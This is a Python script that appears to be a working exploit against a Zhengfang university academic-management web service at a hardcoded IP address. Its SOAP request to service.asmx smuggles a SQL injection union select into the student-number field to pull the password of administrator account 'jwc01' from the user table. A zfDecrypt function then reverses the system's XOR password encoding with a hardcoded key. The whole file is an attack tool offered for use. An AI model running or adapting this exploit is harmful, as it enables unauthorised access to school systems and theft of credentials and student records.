#! /usr/bin/env python
#coding=utf-8

import requests
from bs4 import BeautifulSoup
import os

#session         = requests.session()
#session.proxies = {"http":"127.0.0.1:8080"}     #设置burp为代理

pwdTextList      = []
resultInfoList   = []
urlList =[ 	
			
			"http://211.64.240.25/(bgr3ifuv5ji21djeplqdoj45)/"
            ]


def getPassword(url):
    global urlList
    global pwdTextList
    global resultInfoList
    
    targetInfo = {"url":"","server":"","pwdText":"","pwd":""}
    
    
    headers         = {"Content-Type":"text/xml; charset=utf-8",
                       "SOAPAction":"\"http://www.zf_webservice.com/GetStuCheckinInfo \"",
                       "Content-Type":"text/xml; charset=utf-8"}
    
    
    body            = """<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo">
          <xh xsi:type="xsd:string">222222' union select Null,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01</xh>
          <xnxq xsi:type="xsd:string">2013-2014</xnxq>
          <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
        </q1:GetStuCheckinInfo>
      </soap:Body>
    </soap:Envelope>
    """
    
    
    try:
        response    = requests.post(url,headers=headers,data=body,timeout=10)
        response.raise_for_status()
    except requests.RequestException as err:
        print err
        
    else:
        soup        = BeautifulSoup(response.text,"lxml").find(name="xh")
        if(soup!=None):
            targetInfo["url"]       = response.url
            targetInfo["server"]    = response.headers["server"]
            targetInfo["pwd"]       = soup.text
            targetInfo["pwdText"]   = zfDecrypt(soup.text)
            pwdTextList.append(targetInfo)
            
def zfDecrypt(pwd,key="Encrypt01"):
    tmp = ""
    for i in range(len(pwd)//len(key)+1):
        tmp = tmp + key
    key = tmp[0:len(pwd)]
        
    pwdLength = len(pwd)
    
    if (pwdLength % 2 ==0):
        pwd_1 = list(pwd[0:pwdLength//2])
        pwd_2 = list(pwd[pwdLength//2:pwdLength])
        pwd_1.reverse()
        pwd_2.reverse()
        pwd = ''.join(pwd_1)+''.join(pwd_2)
        
    array_p = []
    array_k = []
    
    for i in range(pwdLength):
        
        array_p.append(pwd[i:i+1])
        array_k.append(key[i:i+1])
        a = ord(array_p[i])^ord(array_k[i])
        
        if((a>=32)and(a<=126)):
            array_p[i] = chr(a)
        
    
    pwd = ''.join(array_p)
        
    return pwd



def main():
    resultList = []
    for url in urlList:
        url = url+"/service.asmx"
        getPassword(url)
        
    print pwdTextList

    #print urlList


if __name__=="__main__":
    main()
